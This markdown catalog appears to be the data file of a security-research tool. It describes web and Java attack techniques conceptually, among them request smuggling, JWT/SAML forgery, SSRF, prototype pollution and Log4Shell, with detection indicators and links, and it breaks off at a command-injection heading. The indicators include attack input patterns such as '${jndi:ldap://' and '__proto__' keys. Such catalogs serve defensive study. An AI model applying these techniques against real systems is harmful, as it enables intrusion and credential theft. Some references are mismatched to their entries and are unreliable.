# MoonMCP — Techniques & Notable-PoC Catalog

> A **referenced** catalog for authorised security research. Each entry describes a
> technique or landmark vulnerability *conceptually* and links to the authoritative
> public PoC / research — it ships **no** weaponized exploit code or shellcode. It is
> the data behind the `technique_info` / `technique_search` tools and the
> `techniques://all` resource.


**115 techniques** across **14 categories**, spanning everything from assembler-level memory corruption to the highest-level web and supply-chain attacks. Compiled from PortSwigger Research, OWASP, HackTricks, PayloadsAllTheThings, ExploitDB, Phrack, Project Zero, shellphish/how2heap, ctf101 and vendor advisories / NVD.


## Categories

| Category | Count | Focus |
| --- | --: | --- |
| `web` | 18 | Web application |
| `language-specific` | 17 | Language-specific injection & abuse |
| `deserialization` | 14 | Deserialization |
| `interpreter-level` | 3 | Interpreter / parser level |
| `memory-corruption` | 11 | Memory corruption |
| `heap-exploitation` | 3 | Heap exploitation |
| `code-reuse` | 7 | Code-reuse (ROP/JOP/ret2*) |
| `mitigation-bypass` | 3 | Exploit-mitigation bypass |
| `kernel-lowlevel` | 10 | Kernel & low-level |
| `container-sandbox` | 2 | Container / sandbox escape |
| `microarchitectural` | 3 | Microarchitectural & hardware |
| `supply-chain` | 1 | Supply chain |
| `unique-technique` | 4 | Unique / niche techniques |
| `famous-cve` | 19 | Landmark CVEs |


## Web application (`web`)

### HTTP Request Smuggling (CL.TE / TE.CL / TE.TE)
*id:* `http-request-smuggling-cl-te-te-cl` · *severity:* **critical** · *languages:* http

A front-end proxy and back-end server disagree on where an HTTP/1.1 request ends because one honors Content-Length and the other honors Transfer-Encoding, letting an attacker prepend bytes to the next user's request. Enables request queue poisoning, front-end control bypass, credential capture, and cache poisoning.

**How it works —** Both Content-Length and Transfer-Encoding: chunked headers are placed in one request. In CL.TE the front-end uses CL and the back-end uses TE (or vice-versa for TE.CL); in TE.TE both support chunked but one is induced to ignore it via header obfuscation (e.g. spacing, duplication, casing). The desync leaves a partial 'smuggled' prefix in the back-end's connection buffer, which is prepended to the following request. Detection relies on timing differences (a deliberately incomplete chunked body causes the back-end to hang) rather than differential responses to avoid harming other users.

**Where —** Chained HTTP/1.1 deployments: CDN/reverse-proxy or load-balancer in front of an origin that parse length headers differently. Reuse of back-end TCP connections across users is required.

**Detection indicators:**
- Time-delay responses when sending an incomplete chunked body with conflicting CL/TE
- Differential status codes/responses between a baseline and an attack request
- Unexpected responses belonging to other users appearing on your connection
- Server or proxy header banners revealing known-vulnerable proxy stacks

**References:** [link](https://github.com/PortSwigger/http-request-smuggler) · [link](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery) · [link](https://portswigger.net/web-security/request-smuggling) · [link](https://portswigger.net/web-security/request-smuggling/finding) · [link](https://i.blackhat.com/USA-19/Wednesday/us-19-Kettle-HTTP-Desync-Attacks-Smashing-Into-The-Cell-Next-Door-wp.pdf)

### HTTP/2 Desync via Downgrade (H2.CL / H2.TE)
*id:* `http2-desync-downgrade` · *severity:* **critical** · *languages:* http

When a front-end speaks HTTP/2 but rewrites requests to HTTP/1.1 for the back-end, HTTP/2's built-in message length can conflict with an injected Content-Length or Transfer-Encoding header, re-introducing request smuggling. Also covers CRLF injection into H2 pseudo-headers and header values.

**How it works —** HTTP/2 carries an implicit, unambiguous message length, so front-ends often ignore CL/TE. When they downgrade to HTTP/1.1 without sanitizing an attacker-supplied Content-Length (H2.CL) or Transfer-Encoding (H2.TE), the back-end derives a different length and desyncs. HTTP/2's binary framing also lets attackers smuggle newlines/CRLF into header names, values, or the :path/:method pseudo-headers, splitting requests or injecting new headers after downgrade. Automated timeout-based detection (adapted from H1 desync) confirms the discrepancy.

**Where —** Front-end HTTP/2 termination that downgrades to HTTP/1.1 origins; affected CDNs historically included Netlify, and later Akamai/Cloudflare-class edges per follow-up research.

**Detection indicators:**
- Successful smuggling only over HTTP/2 (not HTTP/1.1) to the same host
- Injected CRLF in H2 header values reflected as split requests after downgrade
- Timeout-based desync signals via HTTP Request Smuggler HTTP/2 probes
- Edge/CDN fingerprints known to perform H2->H1 downgrade

**References:** [link](https://github.com/PortSwigger/http-request-smuggler) · [link](https://github.com/portswigger/turbo-intruder) · [link](https://portswigger.net/research/http2) · [link](https://portswigger.net/web-security/request-smuggling/advanced)

### JWT Attacks (alg Confusion, none, kid/jwk/jku Injection)
*id:* `jwt-attacks` · *severity:* **critical** · *languages:* http, javascript · *CVE:* CVE-2015-9235

JSON Web Token verification flaws allow attackers to forge valid tokens: accepting alg:none, confusing asymmetric RS256 with symmetric HS256, and abusing header parameters (kid, jwk, jku) to control the verification key.

**How it works —** If the verifier trusts the token's own alg header, an attacker sets alg:none (empty signature) or switches RS256 to HS256 and signs with the public key as the HMAC secret (algorithm/key confusion). Header-parameter injection: jwk embeds an attacker's public key inline; jku points verification to an attacker-hosted JWK Set (SSRF/allow-list bypass); kid can be path-traversed to a predictable file (e.g. /dev/null) or used for injection so the attacker controls the signing key. Success yields arbitrary claims (identity/role) without the real secret.

**Where —** APIs and sessions using JWT/JWS where the library derives algorithm or key material from attacker-controlled header fields, or exposes the RSA public key.

**Detection indicators:**
- Token with alg:none or empty signature accepted
- RS256->HS256 forged token verified with the public key as secret
- jku/x5u fetches an attacker-controlled URL (out-of-band callback)
- kid values trigger path traversal or SQL/command injection
- Server exposes its JWKS/public key enabling confusion

**References:** [link](https://github.com/ticarpi/jwt_tool) · [link](https://portswigger.net/web-security/jwt) · [link](https://portswigger.net/web-security/jwt/algorithm-confusion) · [link](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)

### SAML Attacks (XML Signature Wrapping & Parser Differentials)
*id:* `saml-attacks` · *severity:* **critical** · *languages:* xml, http · *CVE:* CVE-2024-45409, CVE-2025-25291, CVE-2025-25292

SAML SSO can be bypassed by XML Signature Wrapping (XSW) and by parser differentials, letting an attacker forge assertions and authenticate as any user. Recent ruby-saml bugs (2024-2025) enabled full auth bypass with a single valid signature.

**How it works —** In XSW, the attacker injects a forged assertion while keeping the originally signed element elsewhere in the document; the signature verifier validates the legitimate element but the application reads attributes from the attacker's element (different views of the same document). Parser differentials arise when signature validation and data extraction use different XML parsers (e.g. Nokogiri vs REXML) or disagree on DOCTYPE/namespace/comment handling, so the same XPath returns different nodes to each layer. With one valid signature harvested, an attacker crafts assertions asserting arbitrary identities.

**Where —** SAML service providers and IdP libraries that re-parse or canonicalize XML inconsistently between signature check and assertion consumption.

**Detection indicators:**
- SP accepts assertions with injected/duplicated Assertion or Response elements
- Behavior changes when adding comments, DOCTYPE, or namespace tricks to signed XML
- Multiple XML parsers in the validation path
- Signature validates but subject/attributes read from an unsigned node

**References:** [link](https://github.com/synacktiv/CVE-2024-45409) · [link](https://github.com/SAML-Toolkits/ruby-saml/security/advisories/GHSA-4vc4-m8qh-g8jm) · [link](https://github.blog/security/sign-in-as-anyone-bypassing-saml-sso-authentication-with-parser-differentials/) · [link](https://portswigger.net/research/the-fragile-lock) · [link](https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html) · [link](https://hacktricks.wiki/en/pentesting-web/saml-attacks/index.html)

### SSRF and SSRF-to-RCE Chains
*id:* `ssrf-and-ssrf-to-rce` · *severity:* **critical** · *languages:* http

Server-Side Request Forgery makes a server issue attacker-controlled requests to internal services, cloud metadata endpoints, or arbitrary TCP ports. Chained with gopher://, cloud IMDS, or DNS rebinding it escalates to credential theft and remote code execution.

**How it works —** An input that the server uses to fetch a URL is redirected to internal targets. Cloud metadata (http://169.254.169.254/, IMDSv1) yields temporary credentials (the Capital One breach pattern). The gopher:// scheme lets the server emit arbitrary raw bytes to TCP services (Redis, FastCGI, SMTP, databases), turning read-only SSRF into command execution. Filter bypasses use alternate IP encodings, redirects, and DNS rebinding (TOCTOU between validation and fetch, TTL 0) to defeat allow-lists that resolve a hostname once for validation and again for connection.

**Where —** URL fetchers, webhooks, PDF/image/URL preview generators, import-by-URL features, and back-ends colocated with cloud metadata services or internal admin ports.

**Detection indicators:**
- Out-of-band DNS/HTTP callbacks (Collaborator/interactsh) from the server
- Differential responses/timing for internal vs external targets
- Ability to reach 169.254.169.254 or internal-only hosts
- Distinct DNS resolutions during validation vs fetch (rebinding)
- Support for non-HTTP schemes (gopher, file, dict)

**References:** [link](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery) · [link](https://behradtaher.dev/DNS-Rebinding-Attacks-Against-SSRF-Protections/) · [link](https://portswigger.net/web-security/ssrf) · [link](https://blog.appsecco.com/an-ssrf-privileged-aws-keys-and-the-capital-one-breach-4c3c2cded3af) · [link](https://krebsonsecurity.com/2019/08/what-we-can-learn-from-the-capital-one-hack/)

### Business Logic Flaws and 2FA Bypass
*id:* `business-logic-2fa-bypass` · *severity:* **high** · *languages:* http

Flawed assumptions about how users interact with an application allow attackers to skip required steps, tamper with trusted client-side values, or defeat multi-factor authentication.

**How it works —** Logic flaws arise when the server trusts client-controlled data (prices, quantities, discount codes, user identifiers) or assumes a fixed sequence of steps. 2FA bypasses include: navigating directly to post-login pages because the app treats the first factor as 'logged in' before the second (broken logic); swapping the account identifier during verification to another user; no brute-force protection on short numeric OTPs; and reusing/removing the 2FA parameter. Negative quantities, integer overflows, and step-skipping in checkout flows are classic business-logic examples.

**Where —** Multi-step flows (checkout, registration, MFA) that rely on client-side enforcement or don't re-verify the same session/user at each step.

**Detection indicators:**
- Direct access to post-2FA pages without completing the second factor
- Verification code accepted for a different account than authenticated
- No rate limiting/lockout on OTP entry
- Negative or oversized values accepted in quantity/price fields
- Skipping or reordering workflow steps yields privileged state

**References:** [link](https://github.com/swisskyrepo/PayloadsAllTheThings) · [link](https://portswigger.net/web-security/logic-flaws/examples) · [link](https://portswigger.net/web-security/authentication/multi-factor) · [link](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic)

### Browser-Powered / Client-Side Desync and CL.0 / 0.CL
*id:* `client-side-and-0cl-desync` · *severity:* **high** · *languages:* http

Desync attacks that a victim's own browser can trigger by poisoning a shared connection pool, plus server variants (CL.0, 0.CL) where a server ignores the Content-Length on certain requests. Extends request smuggling to sites reachable without an attacker-controlled proxy.

**How it works —** Client-side desync (CSD) sends a request whose body the back-end treats as the start of a new request, poisoning the browser's keep-alive connection so the next same-origin navigation is prefixed with attacker bytes. CL.0 covers servers that ignore Content-Length for specific endpoints (e.g. static files, redirects), making the body a standalone smuggled request; 0.CL is the inverse. These enable stored/reflected desync, credential theft, and response queue poisoning, and are the focus of the 'HTTP/1.1 must die' endgame work identifying parser discrepancies.

**Where —** Endpoints that mishandle request bodies (redirects, static handlers, error paths); historically Amazon ALB, Cisco ASA WebVPN, Apache, Varnish. Exploitable purely via a victim browser for CSD variants.

**Detection indicators:**
- Server ignores Content-Length on specific routes (body echoed as next request)
- Connection-locked response anomalies after a crafted request
- Browser-driven same-origin response poisoning in a lab replica
- HTTP Request Smuggler v3 parser-discrepancy / connection-state findings

**References:** [link](https://github.com/PortSwigger/http-request-smuggler) · [link](https://portswigger.net/research/browser-powered-desync-attacks) · [link](https://portswigger.net/research/http1-must-die) · [link](https://portswigger.net/web-security/request-smuggling/browser/cl-0)

### CORS Misconfiguration Exploitation
*id:* `cors-misconfiguration` · *severity:* **high** · *languages:* http, javascript

Overly permissive cross-origin resource sharing lets a malicious site read authenticated responses from a victim's session, leaking sensitive data or tokens.

**How it works —** The server reflects the request Origin into Access-Control-Allow-Origin and sets Access-Control-Allow-Credentials: true, so any attacker origin can make credentialed cross-origin reads. Related flaws: trusting the null origin (reachable via sandboxed iframes/redirects), weak origin regex allowing attacker subdomains or suffix matches, and trusting insecure (http) protocols that permit MITM. The attacker's page performs a credentialed fetch and exfiltrates the response body.

**Where —** APIs returning sensitive data that dynamically reflect Origin and allow credentials, or use loose origin matching.

**Detection indicators:**
- Access-Control-Allow-Origin reflects an arbitrary supplied Origin
- Access-Control-Allow-Credentials: true alongside reflected origin
- null origin trusted
- Origin allow-list matches attacker subdomains or via substring/regex

**References:** [link](https://github.com/swisskyrepo/PayloadsAllTheThings) · [link](https://portswigger.net/web-security/cors)

### GraphQL API Abuse
*id:* `graphql-abuse` · *severity:* **high** · *languages:* graphql, http

GraphQL endpoints expose broad, self-describing surfaces that attackers abuse via introspection, broken object/field-level authorization, batching, deep/recursive queries (DoS), and mutation-based mass assignment.

**How it works —** Introspection (or suggestion-based schema inference when introspection is off) reveals the full schema including hidden/private fields and operations. Attackers then query fields lacking object- or function-level authorization checks, use aliasing/batched queries to bypass rate limits and brute-force (e.g. OTPs), craft deeply nested/circular queries to exhaust resources, and abuse mutation inputs for mass assignment. Apollo's error-message suggestions leak field names even when introspection is disabled.

**Where —** GraphQL APIs where authorization is enforced per-resolver inconsistently, introspection is enabled in production, or query cost/depth is unlimited.

**Detection indicators:**
- Introspection query returns full schema in production
- Error messages suggest field/type names (schema leakage)
- Private fields accessible without authorization
- Aliased/batched requests bypass rate limits
- Deeply nested queries cause slow responses

**References:** [link](https://github.com/swisskyrepo/PayloadsAllTheThings) · [link](https://portswigger.net/web-security/graphql)

### HTTP/2 Cleartext (h2c) Smuggling
*id:* `h2c-smuggling` · *severity:* **high** · *languages:* http

An edge proxy that blindly forwards HTTP/1.1 Upgrade requests can be tricked into establishing a persistent HTTP/2-cleartext tunnel straight to the back-end, bypassing the proxy's routing rules and access controls.

**How it works —** The client sends an HTTP/1.1 request with Upgrade: h2c and the required HTTP2-Settings/Connection headers. If the reverse proxy forwards the Upgrade hop-by-hop instead of terminating it, and the back-end supports h2c, a raw HTTP/2 connection is negotiated that the proxy no longer inspects. Subsequent requests on that tunnel bypass path-based allow/deny rules, reach restricted admin endpoints, and can forge internal headers.

**Where —** nginx/Envoy/Haproxy-style reverse proxies fronting h2c-capable back-ends where Upgrade headers are proxied rather than stripped.

**Detection indicators:**
- Back-end honors Upgrade: h2c through the proxy (successful 101 Switching Protocols)
- Access to proxy-blocked paths only via the upgraded connection
- Internal-only endpoints reachable after upgrade
- h2cSmuggler scan reporting a viable tunnel

**References:** [link](https://github.com/BishopFox/h2csmuggler) · [link](https://portswigger.net/web-security/request-smuggling/advanced) · [link](https://github.com/BishopFox/h2csmuggler)

### HTTP Host Header Attacks
*id:* `host-header-attacks` · *severity:* **high** · *languages:* http

Server-side code that trusts the Host (or X-Forwarded-Host) header without validation enables password-reset poisoning, web cache poisoning, routing-based SSRF, and authentication/business-logic bypass.

**How it works —** Applications frequently build absolute URLs (password reset links, redirects, script sources) from the incoming Host header. By overriding Host or injecting X-Forwarded-Host, an attacker makes the app emit links pointing to an attacker domain; in password-reset poisoning the victim's reset token is delivered to the attacker's host. Routing-based SSRF arises when the front-end forwards to an internal host derived from the Host header, letting an attacker reach internal systems. Duplicate Host headers, absolute request-line URLs, and injected override headers are common vectors.

**Where —** Frameworks/CDNs that expose the Host header to application logic, dynamic-link generation, or internal routing.

**Detection indicators:**
- Reset/verification emails contain links to an attacker-supplied Host
- Reflected Host / X-Forwarded-Host in response bodies or Location headers
- Internal responses when Host is set to an internal name/IP (routing SSRF)
- Behavior changes with duplicate or override host headers

**References:** [link](https://github.com/swisskyrepo/PayloadsAllTheThings) · [link](https://portswigger.net/web-security/host-header) · [link](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning)

### Mass Assignment / Autobinding
*id:* `mass-assignment` · *severity:* **high** · *languages:* http, ruby, java, javascript, php

When a framework binds user-supplied request fields directly onto server-side models without an allow-list, an attacker can set fields never meant to be user-controllable (isAdmin, role, balance, ownership), causing privilege escalation or data tampering.

**How it works —** Frameworks (Rails, Spring MVC, ASP.NET MVC, Node/Express, PHP) auto-map request parameters/JSON keys to object properties. If binding is not restricted to a whitelist (strong params / DTOs), the attacker adds extra keys to the request body (e.g. role=admin, is_verified=true, user_id of another account) which are persisted. Field names are enumerated from client JS bundles, API docs, GraphQL mutation inputs, or error messages. This is a Broken Access Control / API6 class issue.

**Where —** REST/GraphQL endpoints that bind req.body directly to ORM entities or domain models without explicit field filtering.

**Detection indicators:**
- Adding privileged fields to a request changes account state
- API accepts and echoes unexpected/extra properties
- Object schemas discoverable from responses or client code reveal privileged fields
- Role/status/ownership fields writable by low-privilege users

**References:** [link](https://github.com/swisskyrepo/PayloadsAllTheThings) · [link](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html) · [link](https://owasp.org/API-Security/editions/2019/en/0xa6-mass-assignment/) · [link](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/20-Testing_for_Mass_Assignment) · [link](https://hacktricks.wiki/en/pentesting-web/mass-assignment-cwe-915.html)

### OAuth 2.0 / OpenID Connect Attacks
*id:* `oauth-oidc-attacks` · *severity:* **high** · *languages:* http

Loose or optional parts of the OAuth/OIDC spec lead to account takeover through redirect_uri manipulation, missing state (CSRF), leaked authorization codes/tokens, and unvalidated identity claims.

**How it works —** Common flaws: weak redirect_uri validation (open redirect / path or subdomain tricks) to exfiltrate authorization codes or tokens; absent or unverified state parameter enabling login CSRF and account linking abuse; implicit-flow token leakage via Referer or open redirect; accepting id_tokens without validating iss/aud/signature; and 'hidden' vectors like SSRF via dynamic client registration or request_uri, and scope/consent bypass. Attacker registers or hijacks a redirect target and replays the leaked credential to authenticate as the victim.

**Where —** SSO logins, 'Sign in with' integrations, and identity providers where the client or authorization server skips optional validation.

**Detection indicators:**
- redirect_uri accepts extra paths, subdomains, or open-redirect chains
- state parameter absent or not verified on callback
- Authorization code/token leaking in Referer or to attacker origin
- id_token accepted with altered iss/aud or 'none' signature
- request_uri / dynamic registration reachable for SSRF

**References:** [link](https://github.com/swisskyrepo/PayloadsAllTheThings) · [link](https://portswigger.net/web-security/oauth) · [link](https://portswigger.net/research/hidden-oauth-attack-vectors)

### Prototype Pollution (Client and Server, to XSS/RCE)
*id:* `prototype-pollution` · *severity:* **high** · *languages:* javascript, nodejs · *CVE:* CVE-2019-10744, CVE-2019-11358

Injecting properties via __proto__/constructor/prototype keys pollutes Object.prototype, so all objects inherit attacker-controlled properties. Gadgets escalate this to DOM XSS on the client and to privilege escalation or RCE on Node.js servers.

**How it works —** Unsafe recursive merge/clone/path-set operations on attacker JSON or query input write to __proto__ or constructor.prototype. Polluted properties are then read by 'gadget' code paths: on the client, a gadget flows a polluted value into a sink (innerHTML, script src, setTimeout/eval) for DOM XSS; on the server, gadgets in Express/Node internals (e.g. options merged into child_process, template engines, or config) allow privilege escalation, data exfiltration, or command execution. Server-side detection is often black-box (behavioral/DoS-free probes) since the source isn't visible.

**Where —** JS apps using vulnerable deep-merge/clone utilities (older lodash/jQuery) or custom recursive property assignment on untrusted input.

**Detection indicators:**
- Sending __proto__/constructor payloads changes unrelated object behavior
- New global properties observable after a merge operation
- Reflected gadget reaching a JS sink (DOM XSS)
- Server behavior/status changes from prototype probes (SSPP scanner)

**References:** [link](https://github.com/portswigger/http-request-smuggler) · [link](https://nvd.nist.gov/vuln/detail/cve-2019-10744) · [link](https://portswigger.net/web-security/prototype-pollution/server-side) · [link](https://portswigger.net/web-security/prototype-pollution/client-side) · [link](https://portswigger.net/research/widespread-prototype-pollution-gadgets) · [link](https://portswigger.net/blog/server-side-prototype-pollution-scanner)

### Web Cache Deception
*id:* `web-cache-deception` · *severity:* **high** · *languages:* http

An attacker lures or crafts a request to a dynamic, authenticated page using a URL that the cache misinterprets as a static asset, causing the victim's private response to be cached and then retrievable by the attacker.

**How it works —** Origin server and cache disagree on URL interpretation. Appending a static-looking suffix or path segment (e.g. /account/foo.css) may cause the origin to still return the sensitive /account response while the cache, keying on the .css extension or path-mapping rule, stores it as a cacheable static object. Variants exploit path delimiters, path normalization, and path-mapping discrepancies. The attacker retrieves the cached private data via the same crafted URL.

**Where —** Applications behind caches that cache by file extension or static path rules and serve authenticated content on paths adjacent to those rules.

**Detection indicators:**
- Authenticated page still returns user data when a static suffix/delimiter is appended
- Cache stores the crafted URL (X-Cache: hit, Age header on a normally-private page)
- Origin vs cache path normalization mismatch
- Sensitive response retrievable from a second, unauthenticated session

**References:** [link](https://github.com/swisskyrepo/PayloadsAllTheThings) · [link](https://portswigger.net/web-security/web-cache-deception) · [link](https://portswigger.net/research/gotta-cache-em-all)

### Web Cache Poisoning via Unkeyed Inputs
*id:* `web-cache-poisoning` · *severity:* **high** · *languages:* http

An attacker crafts a request whose unkeyed input (a header not part of the cache key) changes the cached response, so the poisoned response is then served to all users hitting that cache key. Impact ranges from stored XSS to denial of service.

**How it works —** The cache key is typically host + path + query, ignoring headers like X-Forwarded-Host, X-Forwarded-Scheme, X-Host, or cookies. If such an unkeyed header influences the response (e.g. reflected in an absolute URL, script src, or redirect), an attacker sends a request that poisons the cached entry for a benign URL. Related pathways include cache key normalization flaws, fat GET requests, and parameter cloaking ('Web Cache Entanglement' / 'Gotta cache 'em all'). Tools like Param Miner brute-force unkeyed inputs.

**Where —** Sites behind CDNs or caching reverse proxies (Varnish, Cloudflare, Akamai, Fastly) that reflect request headers into cacheable responses.

**Detection indicators:**
- Reflected value from an unkeyed header (e.g. X-Forwarded-Host) in a cacheable response
- Cache-status headers (X-Cache: hit/miss, Age) confirming storage
- Response differs based on headers absent from the cache key
- Param Miner reporting unkeyed input candidates

**References:** [link](https://github.com/PortSwigger/http-request-smuggler) · [link](https://portswigger.net/research/practical-web-cache-poisoning) · [link](https://portswigger.net/research/web-cache-entanglement) · [link](https://portswigger.net/web-security/web-cache-poisoning)

### Web Race Conditions / TOCTOU (Single-Packet Attack)
*id:* `web-race-conditions-single-packet` · *severity:* **high** · *languages:* http

Concurrent requests hitting a time-of-check-to-time-of-use window let attackers exceed limits or bypass logic (redeem a coupon/gift card multiple times, over-withdraw, bypass rate limits). The single-packet attack removes network jitter to make remote races reliable.

**How it works —** Two or more requests operate on shared state between a check and an update (e.g. balance read then debit). Sending them so they are processed simultaneously produces multiple successful outcomes ('limit overrun' / 'multi-endpoint' sub-states). The single-packet attack packs 20-30 HTTP/2 requests into one TCP packet (or uses HTTP/1.1 last-byte synchronization) so all arrive together, collapsing jitter into a sub-millisecond window and making remote races behave like local ones. Broadens attack surface to hidden multi-step state machines.

**Where —** Stateful operations without atomic locking/idempotency: coupon/voucher redemption, account balance, 2FA/OTP attempts, invitation and rate-limit counters.

**Detection indicators:**
- Same single-use action succeeds multiple times under concurrency
- Counter/limit overruns beyond intended maximum
- Inconsistent state after parallel requests
- Turbo Intruder single-packet attack yields duplicate successes

**References:** [link](https://github.com/portswigger/turbo-intruder) · [link](https://portswigger.net/research/smashing-the-state-machine) · [link](https://portswigger.net/research/the-single-packet-attack-making-remote-race-conditions-local) · [link](https://portswigger.net/web-security/race-conditions)

### HTTP Parameter Pollution (HPP)
*id:* `http-parameter-pollution` · *severity:* **medium** · *languages:* http

Supplying multiple parameters with the same name causes servers, frameworks, and proxies to disagree on which value to use, enabling input-validation bypass, WAF evasion, and manipulation of internal logic.

**How it works —** HTTP standards don't define how duplicate parameters are handled, so implementations differ (first value, last value, concatenation, or array). By splitting a value across duplicated parameters an attacker can slip payloads past a front-end filter that a back-end reassembles, override a hard-coded server-side parameter, or cause a proxy and origin to see different effective values (server-side HPP). Client-side HPP can inject extra parameters into generated links/forms.

**Where —** Endpoints where the same parameter is processed by multiple layers (WAF, framework, downstream service) with inconsistent duplicate-handling semantics.

**Detection indicators:**
- Different behavior when a parameter is duplicated vs single
- Validation/WAF bypassed when the payload is split across duplicates
- Response reflects an unexpected precedence (first vs last value)
- Injected parameters appear in server-generated URLs/forms

**References:** [link](https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution.md) · [link](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution)


## Language-specific injection & abuse (`language-specific`)

### Java JNDI Injection (Log4Shell and related)
*id:* `java-jndi-injection-log4shell` · *severity:* **critical** · *languages:* java · *CVE:* CVE-2021-44228, CVE-2021-45046, CVE-2021-44832

Attacker-controlled data reaching a JNDI lookup (e.g. the Log4j ${jndi:ldap://...} message-lookup feature) makes the JVM fetch and instantiate a remote object, leading to remote code execution across countless applications.

**How it works —** JNDI lookups against attacker LDAP/RMI/DNS endpoints can return a reference that causes the JVM to load a remote factory/class or trigger a gadget, yielding RCE. Log4Shell abused Log4j2's automatic interpolation of ${jndi:...} in logged strings; the broader class (documented by marshalsec research) covers any naming/directory lookup on untrusted input. Trust-boundary and version checks are key to detection. Conceptual only.

**Where —** Any Java app logging user-controlled strings with vulnerable Log4j2, or performing JNDI/InitialContext lookups on request data (headers, user-agent, form fields).

**Detection indicators:**
- Strings like ${jndi:ldap://, ${jndi:rmi://, or nested ${lower:...} obfuscation in inputs/logs
- Outbound LDAP/RMI/DNS callbacks to attacker infrastructure (canary tokens)
- Log4j2 core versions 2.0-beta9 through 2.14.1
- JNDI/InitialContext.lookup called with request-derived names

**References:** [link](https://www.lunasec.io/docs/blog/log4j-zero-day/) · [link](https://github.com/mbechler/marshalsec) · [link](https://unit42.paloaltonetworks.com/apache-log4j-vulnerability-cve-2021-44228/) · [link](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

### Java Expression Language Injection (OGNL / SpEL / EL / MVEL)
*id:* `java-ognl-spel-el-injection` · *severity:* **critical** · *languages:* java · *CVE:* CVE-2017-5638, CVE-2018-11776, CVE-2022-22963, CVE-2022-22947

When user input is evaluated as a Java expression language (OGNL in Struts, SpEL in Spring, JSP/Jakarta EL, MVEL/JEXL), attackers traverse the object graph and invoke Runtime/ProcessBuilder for RCE, as in the Struts Equifax breach and multiple Spring CVEs.

**How it works —** Expression languages evaluate strings against a context object with reflective method access. If untrusted data reaches an evaluator (Struts value stack via a crafted Content-Type header, Spring @Value/SpEL parsers, EL in templates), the attacker builds an expression that reaches java.lang.Runtime, ProcessBuilder, or ScriptEngine. Struts CVE-2017-5638 (Jakarta multipart) and Spring Cloud SpEL CVEs are canonical. Detection uses EL arithmetic/marker probes. Conceptual only.

**Where —** Apache Struts 2 actions, Spring apps evaluating SpEL from input, JSF/JSP EL, and any framework passing request data to an expression parser.

**Detection indicators:**
- EL/OGNL arithmetic probes evaluating in responses (e.g. ${...}/%{...}/#{...} markers)
- OGNL expressions inside Content-Type or other headers (Struts pattern)
- Stack traces mentioning ognl, SpelEvaluationException, or ELException
- Outbound callbacks from a blind expression probe

**References:** [link](https://hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/el-expression-language.html) · [link](https://pentest-tools.com/blog/exploiting-ognl-injection-in-apache-struts) · [link](https://www.trendmicro.com/en_us/research/17/c/cve-2017-5638-apache-struts-vulnerability-remote-code-execution.html)

### Node.js Prototype Pollution to RCE
*id:* `nodejs-prototype-pollution-rce` · *severity:* **critical** · *languages:* javascript, node.js · *CVE:* CVE-2019-10744, CVE-2018-3721

Writing to __proto__/constructor.prototype through unsafe recursive merge/clone/path-set operations pollutes Object.prototype globally, letting an attacker inject properties that downstream sinks (child_process options, template engines, require) use to gain RCE.

**How it works —** When code copies attacker-controlled keys into objects without guarding __proto__/constructor/prototype, injected keys land on the shared prototype and affect every object. Server-side, polluted properties can reach command-execution sinks in child_process (e.g. injected shell/NODE_OPTIONS/argv-like options) or template/config lookups. PortSwigger documented black-box detection and filesystem-free exploitation using flags like --import. Client-side variants enable DOM XSS. Conceptual only.

**Where —** APIs using unsafe deep-merge/clone/set utilities (or vulnerable lodash/jQuery.extend versions) on JSON bodies, query strings, or config, feeding into child_process, template engines, or module loading.

**Detection indicators:**
- JSON keys __proto__, constructor, or prototype accepted in request bodies
- Global side effects after a request (a new property appears on unrelated objects)
- Application status/JSON-parse behaviour changes from a polluting probe (PortSwigger technique)
- Use of deep merge/clone helpers or outdated lodash/set-value/dot-prop

**References:** [link](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Prototype%20Pollution/README.md) · [link](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce) · [link](https://portswigger.net/research/server-side-prototype-pollution) · [link](https://portswigger.net/research/exploiting-prototype-pollution-in-node-without-the-filesystem)

### Node.js vm/vm2 Sandbox Escape
*id:* `nodejs-vm2-sandbox-escape` · *severity:* **critical** · *languages:* javascript, node.js · *CVE:* CVE-2023-37466, CVE-2023-37903, CVE-2023-32314

Node's built-in vm module is not a security boundary, and the popular vm2 hardening library suffered multiple critical escapes (Promise-handler and custom-inspect bypasses) allowing code inside the sandbox to reach the host and execute arbitrary commands.

**How it works —** Code running in a vm/vm2 context can grab a reference to a host object (via error stacks, Proxy traps, Promise handlers, or Node's custom inspect function) and walk from it to the real global to call require('child_process'). vm2 tried to sanitize these bridges but researchers found repeated bypasses; the project was ultimately discontinued in favour of isolated-vm. Detection centres on identifying vm2 use for untrusted code. Conceptual only.

**Where —** Online code runners, formula/expression evaluators, serverless plugin hosts, and low-code platforms executing user JavaScript inside vm or vm2.

**Detection indicators:**
- Dependency on vm2 (especially <= 3.9.19) or use of node:vm for untrusted input
- Endpoints accepting arbitrary JS/expressions to evaluate
- Sandbox error messages referencing host internals or async_hooks
- Presence of Proxy/Promise/toString tricks in submitted code

**References:** [link](https://github.com/patriksimek/vm2/security/advisories/GHSA-xj72-wvfv-8985) · [link](https://www.exploit-db.com/exploits/51898) · [link](https://github.com/advisories/GHSA-cchq-frgv-rjh5) · [link](https://github.com/advisories/GHSA-g644-9gfx-q4q4)

### OS Command Injection via Shell Sinks (child_process, subprocess, IFS)
*id:* `os-command-injection-shell-sinks` · *severity:* **critical** · *languages:* node.js, python, ruby, bash · *CVE:* CVE-2014-6271, CVE-2021-21315

